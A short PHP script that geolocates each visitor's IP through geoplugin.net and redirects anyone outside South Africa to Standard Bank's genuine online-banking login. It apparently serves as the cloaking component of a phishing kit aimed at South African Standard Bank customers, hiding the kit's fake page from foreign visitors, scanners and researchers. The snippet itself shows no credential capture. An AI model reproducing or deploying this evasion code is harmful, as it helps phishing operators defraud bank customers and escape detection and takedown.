<?php
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));

$country=$details->geoplugin_countryName;

if($country !=="South Africa")
{
header("Location: https://onlinebanking.standardbank.co.za/#/login");
exit();
}
?>